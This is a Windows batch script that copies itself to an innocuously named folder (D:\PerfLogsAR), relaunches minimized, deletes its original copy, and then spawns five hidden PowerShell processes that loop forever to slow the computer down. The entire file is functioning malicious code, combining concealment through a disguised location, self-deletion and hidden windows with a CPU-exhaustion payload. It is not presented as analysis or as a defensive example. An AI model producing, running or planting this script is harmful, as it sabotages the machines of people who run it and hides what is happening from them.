@echo off
setlocal EnableDelayedExpansion

:: Define permanent location
set "targetDir=D:\PerfLogsAR"
set "targetScript=%targetDir%\slowmode.bat"

:: Create folder if it doesn't exist
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

:: Check if already running from target folder
if /I not "%~dp0"=="%targetDir%\" (
    :: Copy itself
    copy "%~f0" "%targetScript%" >nul
    :: Start copied script silently
    start "" /min "%targetScript%"
    :: Delete original script
    del "%~f0"
    exit
)

:: === MAIN SLOWDOWN LOGIC ===
:: Background lag via 5 hidden PowerShell loops
for /L %%i in (1,1,5) do (
    start "" /min powershell -WindowStyle Hidden -Command "while($true){1..100000 | ForEach-Object {$_ * $_} | Out-Null}"
)

exit
